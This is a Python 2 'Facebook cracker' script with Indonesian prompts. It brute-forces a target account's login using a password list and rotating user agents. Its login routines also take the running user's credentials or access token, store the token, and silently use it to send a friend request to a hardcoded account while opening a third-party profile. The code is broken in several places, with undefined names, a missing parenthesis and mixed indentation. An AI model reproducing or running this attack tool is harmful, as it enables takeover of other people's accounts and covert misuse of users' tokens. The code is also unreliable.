#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import os
import sys
import mechanize
import cookielib
import random


##### LOGO #####
logo = """\033[1;93m_/﹋\_          
\033[1;34m(🌀🌀)\033[0m
\033[1;36m<,︻╦╤─ ҉ ------------\033[0m \033[1;93m*Crack Facebook*\033[0m
\033[1;36m_/﹋\_\033[0m
\033[1;31m╔════════════════════════════════════════╗
\033[1;31m║ \033[1;93m*Author :\033[0m \033[1;97mUPIL FACEBOOK \033[0m               \033[1;31m║
\033[1;31m║ \033[1;93m*Github :\033[0m \033[1;34mhttps://github.com/aryhas\033[0m    \033[1;31m║
\033[1;31m╚════════════════════════════════════════╝\033[0m"""

##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
	os.system('clear')
	print logo
	print
	print 42*"\033[1;96m="
	time.sleep(0.05)
	print "\033[1;96m[1] \033[1;93mLogin Akun Facebook  "
        time.sleep(0.05)
        print "\033[1;96m[2] \033[1;93mLogin Akun Facebook Pakai Acces token "
	time.sleep(0.05)
	print "\033[1;96m[3] \033[1;97mKeluar        "
	print 42*"\033[1;96m="
	pilih_login()

def pilih_login():
	peak = raw_input("\n\033[1;92mPilih Nomer \033[1;95m : ")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
	elif peak =="1":
		login1()
        elif peak =="2":
	        tokenz()
	elif unikers =="0":
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()
		
	
def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo
		jalan('\033[1;96m[!] \x1b[1;34mJangan Menggunakan akun fb lama' )
		jalan('\033[1;96m[!] \x1b[1;34mGunakan akun baru/via token' )
		print 42*"\033[1;96m="
		id = raw_input('\033[1;96m[!] \x1b[0;34mID/Email \x1b[1;91m: \x1b[1;92m')
		pwd = raw_input('\033[1;96m[!] \x1b[0;34mPassword \x1b[1;91m: \x1b[1;92m')
		print 42*"\033[1;96m="
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				jalan( '\n\x1b[1;95mLogin Successful...') 
				os.system('xdg-open https://www.facebook.com/dogukan.er.144')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;97mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;97mSepertinya Akun Anda Terkena Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email Anda Salah")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()

def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[1;96m[+] \033[1;93mToken Facebook \033[1;91m: ")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		jalan( '\n\x1b[1;93mLogin Berhasil.....') 
		os.system('xdg-open https://m.facebook.com/dogukan.er.144')
		requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+toket)
		menu()
	except KeyError:
		print "\033[1;96m[!] \033[1;31mSalah"


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://web.facebook.com/login.php?login_attempt=1'
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;96m[!] \033[1;91mSepertinya akun anda kena checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
		keluar()


os.system('clear')
print logo
print "\033[1;96m    \033[1;93m◆\033[1;31m ⃟ ⃟ \033[1;34m░▒▓ \033[1;93mFACEBOOK CRACKER \033[1;34m▓▒░\033[1;31m ⃟ ⃟ \033[1;93m◆     \033[1;96m"
print 42*"\033[1;96m="
email = str(raw_input("\033[1;96m[+] \033[1;93mID/Email/No_HP \033[1;97m: "))
password = str(raw_input("\033[1;96m[+] \033[1;93mPasword \033[1;97m: "))
print 42*"\033[1;96m="

login = 'https://www.facebook.com/login.php?login_attempt=1'


useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def main():
	global br
	br = mechanize.Browser()
	cj = cookielib.LWPCookieJar()
	br.set_handle_robots(False)
	br.set_handle_redirect(True)
	br.set_cookiejar(cj)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	search()
	print("\033[1;31mPassword Tidak Keluar Dari List")

	
	
def brute(password):
	sys.stdout.write("\r\033[1;96m[*] \033[1;34mCoba Password \033[1;93m👉 {}\n".format(password))
	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['email'] = email
	br.form['pass'] = password
	sub = br.submit()
	log = sub.geturl()
	if log != login and (not 'login_attempt' in log):
			print("\n\n\033[1;96m[+] \033[1;93mPassword yang Cocok \033[1;97m👉 {}".format(password))
			raw_input("\033[1;31m[KELUAR]....")
			sys.exit(1)

			
def search():
	global password
	passwords = open('pass.txt', 'r')
	for password in passwords:
		password = password.replace("\n","")
		brute(password)

		
total = open('pass.txt', 'r')
total = total.readlines()
print "\033[1;96m[*] \033[1;93mTarget Akun FB \033[1;97m: {}".format(email)
print "\033[1;96m[*] \033[1;34mMemuat \033[1;97m:" , len(total), "\033[1;93mpasswords"
print "\033[1;96m[*] \033[1;31mMohon Tunggu ..."
print 42*"\033[1;96m="
	
if __name__ == '__main__':
	main()
